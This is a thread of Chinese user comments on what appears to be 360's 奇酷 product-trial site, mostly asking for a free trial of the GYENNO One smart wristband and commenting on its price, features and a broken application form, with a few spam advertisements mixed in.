特别喜欢这件产品希望可以试用~~ 
各种试用报告吹嘘拍马，炫耀照片的很多，缺少的就是提建议的！我不知道360官网怎么看，反正感觉这篇报告要是不被重视，那就是对顾客不负责任。
攒人品，，求中，
非常期待能试用，然后想推销这款产品
我女朋友工作不能带手机，要放在柜子里面。如果有这款产品就好了！！
  体验体验，看看效果如何，希望很好
这个不能当手机用吧。。。
有消息提醒 够用了
有孩子的申请不上 没孩子的大学生就能申请成功 想买还没有 买一块行吧 暑假要带孩子去旅游 急用呀 
好贵啊，不是平民可以享受的
不错 希望体验
非常期待能试用，然后想推销这款产品 
建议把APP的展示图一行放两个。或者把两张PS到一起。那样可读性就会更强。赞
期待能中，我会如实写测评的，好的话肯定会入手。
好贵，淘宝网要300多呢
好贵，淘宝网买300多呢
希望这次能申请到啊。
哇，这么好的东西啊，时尚与实用，挥然一体，简单却实用，好想得到它
这是一款外表时尚且功能强大的产品，我非常喜欢，期待能中…………
很期待啊 ，很酷 很炫 很实用的产品
太具未来科技感了。。。。。哈哈
很好，看了介绍，功能很强大，希望能试用！
等待...
哈哈，非常感谢~
画得不太好看啦，见笑了。的确功能还是很强大的。
我又看见希望了
外表很酷炫，希望可以试用
好东西 能上牌就好了
精致完美，很棒的产品！
申请已提交，期待
这个可以有。。
是个不错的产品
中签吧 期待啊 
不知道什么时候开始第二次售卖
到底什么时候出啊。一直在关注 。每次上官网都显示是在公测中。。。。真有那么难吗》
看起来不错，只是外观没有太炫的设计
功能很强大哦，360出品就是不一般
很赞，很喜欢，中吧
申请已提交，期待 
我觉得还还不错
不错，希望快点出！！！！
不错，加油，期望中！！！！  
大神，这回中一次吧，不然我会觉得很没面子的
一向支持360产品，永远爱你们的用户，亲，我是亲的粉丝哦！希望有我一份，继续关注360公司
怎么买的啊
这个东西很实用，希望能中个吧
这个东西很喜欢啊，希望能先体验下
每天都在使用中，欢迎大家一起交流
很酷炫的赶脚！！
还有5天时间
不会经常掉线吧！leb，低功率吗！
这次我肯定能中！看着吧，我把小遍买通了.
数量有点少了，亲。
我能把卫士哥买通么？
我一定要中，因为我把卫士哥买通了。 
我把搞产品研发的大BOSS一起买通了，保证中奖！！！
要是最底下也是屏幕的一部分，这就完美了
我也想买通小二
一直没中，再不中的话，我就直接给总书记打电话了哦。
最后的建议好实用，就是不知道360有没有这个技术。
太帅了。我靠。可惜我没领到
外观超级高大上啊！
继续等吧，我也咋等。
哪些买通这买通那的人，有钱就直接去买啊，应该有好多种类似产品。
大家别等了 京东搞了一款一样的产品可以认筹http://z.jd.com/project/details/24.html
欢迎大家指点意见！
没有睡眠质量检测么？
很喜欢这种 可以尽可能的保护视力 对于我这种电子书爱好者更是不可多得的神器啊 希望尽快上市啊 期待ing
价格适中可以买一个玩玩！！
请问蓝牙配对密码。⊙﹏⊙b汗，拿到了飞机，但是连不上！
谢谢你，要是360工程师看到就好了
估计可能性不大吧，我都上不了精品报告的行列
谢谢你点赞
可惜目前还评不上精品报告
技术应该有，就是不一定采纳
写得不错啊，bong我没用过，只知道做工不错，续航很好，但是APP垃圾
APP现在安卓的也更新上来了，昨晚试用了下，但有待进一步测试。
评测写的很不错，Very good！！！
长得像我大学同学，不过我知道肯定不是。哈哈。群里老是潜水啊你
免费申请好难
ok，第一时间告诉兄弟们。我一直想做一个GYENNO ONE和bong的对比评测。到时候我们商量一下，远程协助写一个，如何？
丫头，加油。。。文笔真好 1
防水这检测。。我看了都心疼呢
京东认筹的是一款叫“丢不了”儿童保护表，这款“丢不了”儿童保护表有官方网站（http://www.diubuliao.com/index.html）也可以订购，等不及的父母转移战场吧，奇酷让我们等的太久了。
大神，给我试用试用吧
很喜欢这个产品，希望能中啊！
免费申请好难 哦
我本来还想丢进装满水得杯子里的....看排版我都弄好了，就不拍了，哈哈哈^^
(⊙v⊙) 么么哒
虽然我相信这个报告是一篇很好的报告，但这个排版，这么多的表情符号掺在里面，让我这样刚奔过三的人头晕了，哈哈
求楼主分享申请秘技
哎！没中过一期....不知道这次有我没！！！！！
RP要好，这就是秘籍。。。
虽然感觉比bong丑了点，但是功能上有优势哦
很专业· 看到你们这么测评我直接剑走偏锋平外观工艺了。。。
期待啊！！没中过一次
很喜欢这个产品
很喜欢这个产品
笑死人咋办
很不错哦。
如果发现好多次都同步不上的情况改怎么办啊！。安卓版的。
貌似很不错的样子，想要
是蓝牙的应该没问题吧。
好棒！我想要！
据说1，推出之后再上 2.检查电量是否充足 3.下载官网最新app  刚更新哦~~
期待！！！！
很想有一个
这个GYENNO One智能手环我觉得功能外表都非常不错的，很适合我上班族用的。
说实话看起来好像很先进！我想要！我觉得应该还加上一个简单的手电筒的作用就非常完美了
这种贴身小电子产品，既然在试用，那就说明需要提高，要把产品交给有这方面经历的人，才会有收获，鄙人自荐
真的挺喜欢这款产品，特别是两点 第一外观简约 第二无声闹钟  希望能逐渐这款产品会逐渐完善！ 
觉得很鸡肋的感觉.
我觉得这就是一个广告说得比实物还好的产品.
地址不能保存是怎么回事！
 你觉得，那块黑白塑料和  妞有一毛钱关系么。
学苹果的饥饿销售法
奇酷网弄的不错，都是喜欢的东西！
一看就知道这产品过于理想化,绝对没广告上说的那么好!
视频效果很棒啊。感觉外形非常小巧。
申请的人有多少我不知道,但看到只有30部产品我就知道又在买彩票了,这个机率我想你们都懂.希望你们能中奖.我没申请.煮饭去了.
新颖科技，试了再说。
希望可以采用八g内存。 
手机丢了怎么办？
有没看到倒数第三张图片，那位男士手腕的手环，不清晰也就算了，看上去真的应该是PS的，太难看了！而且广告上介绍的太理想化了，不现实。
新颖科技，试了再说。  
新颖的科技！希望能得到使用最好！哪怕得不到我也愿意花钱你尝试这款产品！太喜欢了！！！
外观不错！！！！
我买什么从没中过奖  这次也只是试试手气
什么时候能弄好？？？狠期待！
好东西啊 不过我申请试用这么多次都没有被选中过  哎~~~~~~~~~
新颖的科技 好东西啊这次也只是试试手气
那完全是聚焦的问题并不是PS，若是一个专业人士，不会说那个是PS，另外说，他们生产这种产品，既然有敢在360里面打广告，何必去虚拟一个产品呢，让模特带一个表划算，还是找人PS一张图划算，换做你是老板的话
当然能把手机的所有功能都集成在里面，实现真正的智能化。
额啊 额啊  我运气不会怎么样都不会中奖  上面的注意事项 估计没我的事
尼玛、老子申请了、地址保存不了、什么垃圾产品、、
希望能使用到一个。
地址保存不了事什么原因？
新颖科技，试了再说
试试手气吧！毕竟这东西是新科技样式看起来也不错。
运气一直不好，应该没我什么事。。。。
1块钱就有机会买到苹果5S,三星等手机，百度搜1元欢乐购或者www.1yhlg.com
也不知道是不是真的可以***，也许我也就是一个过客吧，也注册了，但愿能选中我，我给大家先试试看看好使不！也许也是骗人的。关注吧....
申请试用的页面都不能保存，也不能提交! 发在这里了！ 1、智能语音输入，可直接口述，发短信，打电话，接电话； 2、利用无线技术连接更多的设备，让智能手环更智能（例如：结合于家电wifi遥控、开关电源插座等与生活相联系的技术。） 
3、结合电子狗、脉搏、心率测控报警、体温测控报警等； 4、可开发子母机，婴儿佩戴一个或放在婴儿房，家长佩戴一个，婴儿有动静时，及时提醒； 5、可开发情侣机，情侣相互为对方设定作息和报道录音功能，结合手机APP和wifi将报道记录发送在另一方，特指女性为男朋友定制作息等，同时在销售角度讲，估计有很多谈恋爱的朋友们，一次会买两台；
蓝牙设备。 离开手机，就啥也不是。
从来没中过什么，来报个到，还是希望能中
一直很想弄个ATV,,,,看了这个又想要这个
写了半天，地址居然保存不起！！
试了在说，我希望我中
各位亲，地址保存不了的请关闭浏览器后重新登录即可！
喜欢，关键是价格
看官网数据是蓝牙  4.0   向下兼容3.0否？我也没试过，只是听说不行……萌萌哒
每一期都试，没中过一回，不过还是坚持希望能中！！
重来都没中过
如果能加入MP3蓝牙系统那就更好了。
也不知道是不是真的可以***，也许我也就是一个过客吧，也注册了，但愿能选中我，我给大家先试试看看好使不！也许也是骗人的。关注吧....  
比较实用的设计，但推广的话关键是价格
希望有遥控拍照和录像的功能，指纹识别，别人都一戴就会发出警报，像正常手机一样，要有连接无线网络的功能，各种社交软件都可以使用。 更方便携带，不用怕丢，而且外观很酷，如果真像介绍的那样，还能改善睡眠，身体也会更健康
地址都保存不了申请鸡毛啊
希望会有更强大的功能，和其他的颜色，屏幕大一点更好、可以听歌、看视频。最好是可以和手机连接，防盗防丢失。
我希望智能手机环可以通过它的来电提醒功能，让我的工作与学习的效率更高，因为可以很大程度的避免漏接电话，这很方便。 我同时还希望能通过每天精准的活动提醒功能，来督促与监督我自己，以保证做事情的效率与质量。 以上两点都是我希望GYNNO One 智能手环对我的生活的改变。 当然，无线充电是非常酷是一件事，希望它能给我的生活也带来无限的活力^_^。
等不吭吗？
已申请，坐等名单，期待中签，期待评测。
外观时尚 功能强大,很喜欢，爱不释手
坐等成功，已申请。
无线充电没有电磁辐射吗？
已申请，坐等名单，期待中签，期待评测。
立志以后要买一个
我希望手环能在表面上方显示小型虚拟3D立体画面，能与手机等通讯工具连通使用，最好能进行视频电话！！！！
手机上有插件接收器么？能同时多台手机使用么？
我平时电话比较多，就算经常换铃声也还是会有幻听，感觉自己手机响了，然后伸手摸摸口袋，果然没有响。智能手环之前也有听说过，一般是记录睡眠运动量什么的，跟我的关系没多大，也就没再继续关注这类产品的发展了。 如果真要说最想得到的功能，我希望可以显示来电的同时显示号码，并且可以取消手机的震动及铃声。遇到不想接听又不便挂断的号码，这个功能真是太好了。 基于手环大小以及耗电量和使用方便性的考虑只提出上面一条
每次都申请失败，难道是我的头像太酷了？？？
功能都都不错，很看好它，希望能中个试用名额。
好棒！！！快上市！！
我要看真人秀！ 要看到脸的那种！
我也是的  啊
你看过的啊- -！
太帅了，应该很贵吧。以后一定要买一个啊。
已申请，期待中签
我真的很想希望呢给我个名额！
我也是  纠结
希望能选中我吧
我也保存不了
提交不了申请，地址不能保存
期待真炫耀神器中签。
哪个防水的户外产品不这么说？xx国进口xxx，xxx材质质量有保证。烂大街了的广告词。
飞机最怕螺旋桨断了   我的断了尸体还放着
me too
好希望能选到我！
噗...价格才是重点，对于各路大豪来说，拿手机提升档次的都是壕，而豪是用无线技术来提升档次的。俗话说，壕重在一个土字 - -
不知道什么时候开始第二次售卖
刷新一下网页就可以了先申请了，这在审核，希望希望在30发子弹中被一颗子弹打中，死不足矣
嗯，应该是制作工艺，皮质面料要保证温度的问题，是个问题。
QAQ 盖儿茨儿同志没机会了。。。。。。。。。
你赢了.............
首先，你要明白，什么叫创意中...........
很炫酷，很喜欢
这车不便宜啊。狗买宝马了。
技术正在排查中哈，会尽快查明并处理完毕，请及时关注网站动态并留意公告~
喜欢，奢望可以被选中
刷新一遍再填就好了
偏远地区，期待中。。。。
+1     ...
好喜欢，奢望可以能选中
好炫，好喜欢，上帝大大，选到我把
yyy2230希望你能怀孕， 哈哈几十亿个小蝌蚪只有一个洞洞钻，你这30发才中1发，几率很大!!!坐等...
希望能给我一个哦！让我为你们推荐！
希望能给我一个哦！让我为你们推荐！  
周布斯同学加油
提交申请完全没问题了。小编在论坛已经说明了。大家加油申请。有问题要积极反馈啊。
期待真炫耀神器中签。 
我们新疆好地方
在哪里下载安卓版的APP？
感觉不错，期待试用
不知道什么时候有试用，哼期待，老爸的高血压一直哼高，希望借助着表能够随时查看身体情况 
希望我能抽中啊，谢谢
功能不错，期待试用
自恋，本来不是精品报告，放张图片冒充。。。
比我现在用的三星手腕要薄，真心想体验一下它的商务时间安排，户外运动功能 ，希望以后再推出超薄，超级功能的电子手腕，不断的让我们做电子商务的人方便 快捷，期待。。。
中了如果带着感觉不错 买一个顺便推荐给朋友
我自己为自己点赞！所有报告中，我的字数、建议、图片都是最多的，我就不信得不了精品报告。。。哦不，是极品报告！！！
路过看看！
 想试试 如果适用可以多买几个送人，方便业务上的交流。
呵呵看起来是不错哦。很想拥有的感觉，有这样的产品确实方便了很多。能给我来一个不，呵呵让我感受以下意想不到的感觉好么？
我期待...
这是一混蛋设计，放在家里你家是沙漠，放在哪都是破环，白痴设计。
颤抖吧！地沟油
下次再有机会就不水……
额，下半年工作比较忙，然后奇酷还有时间限制，只能提前发了，我后面又买了一个插座。
已经进群了~谢谢推荐
谢谢支持……也祝你下次中签
多谢建议，我下次好好排版！主要奇酷不能保存草稿，只能一气呵成，然后我是现在WORD里面写的，再粘贴过来，要是能保存草稿就方便了
若是感觉很好。会购买些给员工
等等看评测，如果感觉好，自己买一个。
很大气，既实用又时尚！
能接打电话就完美了 
我已提交申请了，如能有幸得到试用，我会同时再购买一副让我太太使用。万分期待！
呵呵 从来参加抽奖啊  什么编辑短信就有机会赢什么啊 都没中过，这次再没中 我下次...我下次...我下次还参加
如果通过实用检验真有网上描述的那么好,肯定会给家人买一个.
这个简直是太帅了！！！赶快出来啊，我要用！！！
如果不错一定建议我的同事们买，因为医师和护士们都把自己累垮了去帮助病人。
期待新宝贝（健康监测仪）的降世，如果真的那么准确，我们应该建议我们的病人去尝试一下！
不知道怎么购买，价格多少？
太棒了！好方便哦！
高大上，有报道说RMB1500左右！
等等看评测，如果感觉好，自己买一个。
等等看评测，如果感觉好，自己买一个。
可以考虑一个
欧蒂芙奇迹面膜强势招代理中，有兴趣可加微信：liao724837882
在开发一个GYENNO One 手机分离警报器，由用户自行设置手机在离开GYENNO One智能手环，那就完美太多，这样“糊涂虫”些就不会在遗失自己的爱机了！小张求试用!谢谢！! 
最好能控制饮食，帮助不爱运动的懒人减肥。。。，生病的可以定时告知吃药时间，是否吃过药。。
太有心了。。。。
看介绍这车真的不错，好像是无懈可击了。不过我担心的并不是这些，而是这车的售后服务怎么样。不管产品再怎么做得无懈可击，它总是会损害的，那时我们该怎么办呢？
期待中，想拥有。
888888
等等看评测，如果感觉好，自己买一个。
使用电子产品主要是图一个方便。这个产品看起来比较笨重，不会很实用。
功能真多呀！不看不知道，一看吓一跳。我绝对要小张，我求试用!谢谢！
如果好用，就推荐到朋友圈
贵了点，要是便宜买一台天天 冲浪。。。
 来一个吧· 很棒的
智能手环真心不错，好想来一个~
看产品介绍宣传，对产品质量觉得不错，真心想拥有一个这样的手表，应该会让我的形像提高，本人想申请一个，望通过。
没有标注尺寸
看似很强大 而且看产品介绍很实用 对于热爱运动的我 确实方便很多 希望能申请通过 真心对这款手环心动了 通过比较感觉这款不错  
很实用和人性化的设计 ，但是看现在市场的话 对于比较潮的人来说 产品进入市场后会有不少人关注 希望能够提前做一下市场调查会更有效果
貌似不让上道啊 
好，给我试用一定大力宣传
看起来对于经常跑市场的工作来说 方便不少  确实很实用
好酷，第一次知道手环可以这么强大，好喜欢，希望马上拥有
挺好的 对于孩子来说是另一种精神上的满足  自己画的东西可以打印出来会增加不少乐趣 不知道价格和耗材 现在市面是不是能够满足呢
看着挺舒服  就是价格有点接受不了 毕竟在实用过程中 这个价格有点...
真的不错呢，功能强大，设计人性化，真心申请一个
很好的东西  以后家里挂的字画 可以自己弄了  呵呵  真心想要  哈哈
很实用的行车设配  期待适配车型能够再增加一些
功能实用，所有的一切都很吸引人，是运动达人，时尚达人的必选
2辆电动车的价钱，1辆1000-5000元。就是不知道说的那个价格段的2两
看来现在是智能时代了 哈哈  看着挺好 家庭备用一台不错  很方便啊
好产品希望有好售后，有更强大的开发团队以及创新精神！
超酷  功能很实用
看起来很实用，不知道是不是真的很实用，只有用过才知道!
外型美观，方便携带。最重要的是可以提高形象！
炫酷实用都有了
GYENNO One智能手环，你值得拥有。
我是做通讯的，就是希望看到一个好的产品。
好贵啊 有木有
功能很赞，我相拥有
比较期待。
真心强大，很使用。外表很炫。值得拥有一个。就算申请不到。很期待什么时候上市，全家一人一个！
被功能吸引了，被外形吸引了。。。
希望能添加GPRS定位，我用手机能够定位到手环的位置。至于有些人说当做充电宝有点胡扯，但是我希望它里面能添加U盘的存储功能，增强办公的实用性。
给我来个。哈哈
我最关心的是它是空气检测仪，那就请说明一下能检测出目前空气的一些什么数据？
我想把这个作为生日礼物送给妻子
我靠，你不带手腕上难道还想待在别的地方？？
很想试试感觉  一会看看别处有卖的吗
看着好使而且空间占据小相当带个手表很不错功能也挺全。比较不能当智能机试用。
手表看起来功能不错，但是找的这个女模特忒做作了。恶心巴拉
超喜欢·我想要
模特儿是不是没穿底裤？
真心强大，很实用。外表很炫酷。值得拥有一个。就算申请不到。很期待什么时候上市，全家一人一个！ 一定也会推荐给身边的朋友啦。！！！
对于我们这种对电子产品半文盲的，可以试用喔，这么强大的电子新品，值得试试
什么时候有的买啊？
对啊，将近1000多呢
被功能和外表深深吸引了，就是有些贵
穿了,你再看看
从介绍看，也没有什么大用处。
鸡肋，不好用
看着很好，功能很齐全，智能化，适合年轻人筒约大气
网速时好时坏，有时候都找不着 
还有这种东东的，申请一个试试它的强大度。
不错，但只是概念啦，早日出成品
照片拍得真差，也好意思拿来做广告
沙发，牺牲了一个U盘，写的很详细，很具体，你不发我都不知道有内测版，赞一个
看上去很炫
期待。。。。。。。。。。。。。。。。
期待ing。。。。。。。
好产品希望有好售后，有更强大的开发团队以及创新精神
一直都非常想尝试这种表，时尚，有范，款式新颖。
一直都非常想尝试这样的表，时尚，有范，新颖，有着年青人的张扬，非常期待。
什么时间开始购买 
谢谢支持！！！
我也是这么认为的 
我喜欢，太好了
变形金刚 太牛啦  ，，，手机太贵买不起 
我的最爱 ，，，，，，，，，，好强大的ROG G20游戏主机什么时候到位 
一出来就买了，没想到这里有试用，这东西还不错，目测还是挺准的。不过更加适合健身和减肥的筒子们。其实说实话就是个电子秤加上四个电极（生物电传感器）。而且对连接设备要求较高，APP要求安卓4.3及以上还有苹果的设备型号也有要求
期待体验机会~
就是贵，200~300还差不多
牛歪了。。。。。。。牛，，，，，，，，，，，，，，，，，，，，，，就是有点太贵啦 
看上去，高大上，很不错的设计理念，
很期待哟~~~~
外型美观，方便携带。先进的Gyenno-X活动跟踪引擎精准的运动检测 ,能够动态识别多种运动状态 结合One APP，有助于精确管控运动计划.革新的充电方式无线充电，彻底摆脱线材的束缚 .不会为错过重要电话和短信而烦恼！ 精准非常的活动监测 ；炫酷至极的无线充电 ；实用给力的来电提醒 ；强悍持久的使用时间 都是我看中它的主要数据！也希望它里面能添加U盘的存储功能，增强办公的实用性。
很期待啊！ 快开始吧！
不知道质量怎么样 
试用不用钱吗？
我想说既然防水防水，可不可以加入一个摄像头，去漂流什么的就可以拍相片或者视频
%&gt;_&lt;% 酷！
很好很不错的手环
问题是他有个防水功能，如果添加优盘的想法的话，防水就会被摒弃，估计他们舍不得这么做啊
咱看中的是防水的，到目前为止已经被汗水渗透坏2个手机了掉水里好几个了
功能不错 就是价格贵····
不知道这表怎么样，期待
很想尝试这样的产品啊
能拍摄相片、录制视频，这功能真不错。价格让我望而止步。
很期待，申请了，但不知道能不能收到可以试用信息
电池与屏 决定了它的续航能力  看到很多要求要加太多的功能并不太可行   
可以防紫外线吗
从来没用用过这种产品，好期待啊。。。。。。。
说得再好，也得试验过了才知道！！很期待...
说得再好也得试过了才知道！！很期待！！！
很期待呢，最怕出汗进水，这个还可以防水很好呢
哈哈增加心动功能，走大街上，俩人带这个智能手环，相互看上对方的话，它就能有感应，嘿嘿
不知道是否物有所值，试过才知道!很期待!
真的可以隔音   不过体积太大了   有没有小型的  类似于耳机之类的隔音产品？？、
增加血压跟心率、GPS监测功能，买给老人家用多好啊。。。
不知道是不是和说的一样
无线U盘，你懂的
试用太少了，才30个  说的太多了，试过才知道 以前有类似的产品，都不了了之，国外比较多，现在ios也进了很多测量模块
真好  我正需要这个   学习压力越来越大   坐姿也不好了 怕以后会驼背  ~~~~(&gt;_&lt;)~~~~     
手环有两个点，一个优点和一个缺点，优点就是功能不错，缺点就是价格太昂贵了。
I need you
试用流程： 申请 点击【免费申请】,提交申请信息。 审核 进入我的试用查看申请状态。 收货 筛选通过后等待发货。 提交 收货后规定期限之内提交试用报告。
貌似申请理由是问会给生活带来什么样的变化吧？又没问希望增加什么功能？
真好  现在的人越来越不喜欢喝水了  在同学中 只有我一个列外
好多评论都被删了啊，有这精力不如早点开售啊。
个人觉得应该加一个定位功能。。。这样在野外不怕迷路。。更好与手机联系在一起。。
价格、价格、还是价格
索尼的要8000RMB左右，不知这款多少钱，性能怎么样
希望可以出燃油版 充电的有点不爽
tt没有知名度？小便你自己组过电脑吗？买过散热器机箱电源吗
丑的一B 丑的一B
我想要个蓝色的   送老爸
扯犊子 我不会买的
图文并茂，解释很详细
深圳很多路段禁止电动车上路
怎么关注后没有任何“免费申请”的提示，我可是专业试用30年，您值得信赖的品牌！ （微信号：374855698）速速联系谢谢！
外形很酷，看起来也好用，价格吗有点不大众啦
图片很赞哦  
期待ING
很好，很喜欢。
太强大了！
该宝贝的“可靠性耐用性兼容性”如何？ 强烈关注！
很期待，人性化设计，值得拥有
就是有一点不足之处，电脑关了就无法使用了  
839价格不低，具体怎么样还需要使用之后才知道~~~
希望能中！！！嘻嘻嘻
外观时尚大方，功能强大，值得购买！
哈哈，我觉得这个外观挺简约的呀~
挺漂亮的。。
我使用360好多年了，我在2008年就用360杀毒软件还是花钱买的，我是360的忠实粉丝，还是个修电脑的，我用的百分八十是360的软件，工具
外观时尚大方，功能强大,跃跃欲试
好想买一个
对我来说，喜讯！希望能有长的巡航时间，高清“拍”“摄”，镜头能360度旋转和变焦（光学的最好），当然，价格要亲民。呵，可能吗？岂当“做梦”吧。
太棒了！！！
是真实的如有假没有儿子送终
价格亲民才是关键。
好点子  不错
说得对 赞成
很期待，人性化设计 外观时尚大方，功能强大,跃跃欲试
人性化设计，值得拥有，但价格似乎偏高了
似乎不错，赞同
漂亮  期待 
谢谢表扬哦
没人评论哇。。。
为什么不把U盘容量做大点呢，比如32G，2010年买的16G，现在16G都感觉小，更不要说才8G了。期望出32G以上的。
很不错的 要是颜色在多一些就好了 
一定要防水o(∩_∩)o 哈哈，我才买
外形简洁大方，功能很强大，太喜欢了
什么时候出啊，一定要微信通知哦，真心想买，希望不要太贵就好
好像要一个
辐射很厉害的！
3C支持么嘿嘿
想买一个，但是价格太高了
这个都卖了1年多了，也算新硬件？
智能手环很不错，真的是值提拥有
应该是市面上宣传出来最NB的智能手表了。
其实这个盖子拔下来插在后边还是挺方便的。
但愿能中啊！别让我失望 
功能型的评测，要是图片再清晰点就好了。
黑色 大气  外观不错 喜欢
哪里有卖的?我要买
不知道辐射会怎么样
我是一个非常喜欢猎奇的人，这款产品直接让我眼前一亮啊！希望能中签啊！！！
超赞超赞，不论外观功能都超赞，希望能有更多新功能！
试用完是不是要寄还给他们？
一直申请，希望可以中签~
哇呜，超爱，好想要啊，太适合我了
想要ing
是不是申请理由写的太少了。
不用的。。。。
中不中不要紧  重在参与。
黑色样子不错
不错，散热问题应该加几个建议
超喜欢，希望能如愿一场
现在车锁的关键是 既要锁前后轮 又要锁车架 座杆 还要能把车固定在一个地方 少一样都丢零件
非常赞同。大家一起多接触智能硬件。支持奇酷。
到处爬的感觉不错，不用手搬了！
工资都发不出来。。。
喜欢，关键是价格！确实价格！
小姑娘带眼镜美观可以理解，但不要带着镜片~~
这个必须赞！
体会智能产品，是我生活的一部分。
不用寄，但是要写报告
 最期待无线充电 高大上 啊
重要的是参入其他的其次。
第一眼也以为带电熨斗的功能，哈哈~~
蓝牙耳机，笨
期待对产品的体验····
看起来是比以前出的3D打印笔要好 但是究竟实用性还不得而知
很漂亮 没普通智能表那么呆笨  精致
像手表一样，赞
这手表卖么？我们家宝贝也想帮他买一块呐！什么时候可以买呀？急呐……！！！暑假到了哟！太需求这个了！麻烦赶紧的上市吧……
酷酷酷酷酷酷
可以废物利用 很好但是实用性不怎么样
很期待 有助于培养孩子的想象力而且简单不用很高的风险
很实用。外观不错
超级喜欢科技好发达啊 
这个外观简洁  价格也不是很贵功能也强大但不知道是否符合人体美学设计
一起多接触智能硬件，期待对产品的体验，最期待无线充电···· 
对此品很有兴趣，希望辐射不要太大，别影响附近皮肤的健康就好。
看起来不错呦 就是不知道用起来如何 很期待
真好，愿意尝试，棒！ 
真是创意无限啊
是免费的吗？送过来之后要付钱吗？
觉得很时尚很酷 也很实用 
小巧，精致，时尚，就是不知道是否有缘一试。
期待可以适用  好的话 给我女朋友也买个
有疑问要钱吗
ok，第一时间告诉兄弟们。我一直想做一个GYENNO ONE和bong的对比评测。到时候我们商量一下，远程协助写一个，如何？  好的兄弟有机会我们交换玩玩！
将军！！！感谢大神的支持！！！
这东西太棒了。
想开网店加QQ 1472909565  提供技术货源 代理发货 处理售后
k h h h h
网名是我QQ  想开网店的朋友可以加下 提供教学 技术 货源 代理发货 处理售后
很好地保护建筑原墙，减少漏电，解决无线开关重量和更换电池的麻烦，更美观和已接受
只有祈祷......
好，很好。
看起来很实用 很酷
小编大人，我真的非常需要这款产品！！！现在正在进行我的减肥计划，五天减了四斤，希望在减肥的同时佩带着神器，能让我时时了解自己一天的运动量，以便制定出更合适的自己的计划。在这里真诚的希望自己能被辛苦的工作人员选中，也祝工作人员事业顺利，买彩票中大奖！！！！
希望很实用。
天灵灵地灵灵，太上老君来显灵，此签必中
试用完了还要寄回去吗
土豪的玩具。
或许Gyenno One在不知不觉的把我没有拥有One时错过的事改变，我很期待Gyenno One给我带来新的生活，我很期待他能把原来我不经意遗忘的时刻提醒我，或许这每一个细节会使我人生的脚步改变，Gyenno One细节改变生活！ 期待我能选上， 我会珍惜拥有Gyenno One给我带来的每一个瞬间。谢谢
视频那个看不了，要不先去掉吧
要钱吗？要钱的话我不要了
不能上路，否则能成为洪涝利器！
   我最喜欢写体验报告书了！教给我准没有错
如果真有这么强大，上市后我就用此设备设立一档网络电视节目！
求大婶保佑，祝我中奖！ 我中奖之后，一定把包装盒送给你！
怎么没报价
怎么没报价
怎么购买呀
哎，命随天意，大家都想要啊。
期待，感觉满高级的样子，想好好的体验一把！！
能打电话吗？
我认为，一个智能的产品，最主要的就是易于上手，人性化，安全与舒心。所以我以及我的朋友们一直使用苹果的产品，这次有等iWatch的期望，如果GYENNO One智能手环真的十分好用，那我们就不必等库克那个人推iWatch了。毕竟我也需要健身，拿着iPhone或nano7都觉得不方便，所以，我希望它能好用人性化，并不是必须要什么很高的理由，就是如此。
外观很酷，建议加入音乐、指南针、地图的功能
好东西就要分享
试用完了还要寄回去吗？
应该附带激光，逃生锁链的功能，以此来成就一款集休闲娱乐、逃生救美的神器
如果被选中的是不用寄回去的。但是申请的人好多。需要写比较充分的申请理由，还要有很多的运气成分。
好用的话，我就给我老婆、老妈、老爸都买一个，送健康才是硬道理
你用的是安卓还是苹果啊。
哪里可以买到，我直接买一个试用算了
应该不用吧
非常期待产品的下线，让我们的生活富有智能、方便、快捷等效果 值得我们去拥有
那里已经有现实有电话功能，就可以打电话
公关公司做活动用还不错
奇库网     839 
支持如此高档大气的产品，望越走越好！继续让我们这些试用达人试用此类高端产品。
提两点建议： 1、去掉测试仪底部的喇叭，或者提供该喇叭声音开关按钮。增加所连接手机在测胎心时播放实时声音的功能。 2、优化胎心录制的声音质量，播放时应可随手机音量调节实现声音强度的明显变化。目前是录音声音实在太小了。
很酷的外形   ，便宜点就好了 
   可能么？这科学么？
估计很容易留下指纹吧  
很好  很强大
不错    看看跟moto 360比起来 那个更好
售价是个难题啊 
不错  希望赶快出来产品        
自己学好英语是很重要的，但能有如此外设附件从旁协助做到事半功倍也是不错的选择！
蓝牙转接电话，这是硬伤，我是不想带手机才买这个，那要是蓝牙连接，就意味着手机和手环不能离开几百米，那我要这个还有什么用
在哪里可以买到？
它的功能真的大吗
先试试好用的话 我技校团购。但是到时候要优惠点
好多次了都没中，这次就中吧！！
中吧，很喜欢啊
很酷 非常漂亮 不过这类科技产品价格对普通人来说还是有点高啊
草，这就是泡妞神器？你当我的4S是摆设。
我一直想买一个，要是能试一下，在给父母买一个
 喜欢便宜些 能大众化些。、、
这玩意 有啥用 360广告还泡妞神器 欺骗我这可怜的屌丝的感情 哥一天睡10小时 上课时间外算 重复最多的运动 估计就是踢被子 和 牙签剔牙 你觉得我还需要这玩意么？ 就是免费送我 我拿来也就往家里一丢
预约有什么用，还是抢不过别人。第一轮的时候我就预约了。但是在10点发售，要上班。公司网络不能购买。等下班回家了，啥都没了！！！预约是用来干啥用的？？？？
看起来很帅气，希望可以买得到
来吧，COme on baby
很不错的一个表，想试用！！！！！！！
很想体验一把！
非常不错，希望能试试，好的话，推荐给朋友
这个测试很详细！赞一个
第一次发现这个网站，但愿能体验吧，这东西很好啊啊
支持如此高档大气的产品，望越走越好！继续让我们这些试用达人试用此类高端产品。 
好像挺酷的样子嘞，申请一个，体验体验呗哈哈、
**************** 
4s真心是垃圾 
上周刚发布，价格390刀，今秋开卖。
谢谢~~~
求被抽中，本屌想约炮啊！！
真给力！看完这后觉得真心不错
小米都出了
垃圾小米，我才不买啊
同下····················
加油啊。要坚持关注才有更多的收获啊。
哈哈。看来你不适合这个产品。但是有很多人都很适合。
好容易被抽中了，到现在还没收到，有点郁闷了。。。。。。。
好想知道预售价格
你就直接说多少钱，哪里有卖的，搞什么免费试用浪费时间。
官网可以购买，839 可以直接去买,,,
希望能有机会得到这样强大功能的产品试用机会，谢谢主办方
弱弱的说，能抢到不 0.0
问一下，OPPO的手机能不能用！如果能用的话，希望能够抽到我！嘻嘻！
稀饭 看着好好的样子  
好完整啊~果然是超大型的
卧槽，广告上这女的是万万没想到里的保洁小妹吗？
那是多少折
好高大尚的说，求中奖啊，求中奖，南无阿弥陀佛！
有概率申请到就好！！
真希望能过把我的建议，用到他们的产品
期待它的出现！好想拥有一辆！哈哈！ 
我知道这是变相的做广告，但是还是希望能抽到我。
提交申请按钮点击无反应，是不是骗人的啊》？？？？
好期待·求中奖
希望能被抽中，通过自身体验总结成体验报告，促进产品更加完善。
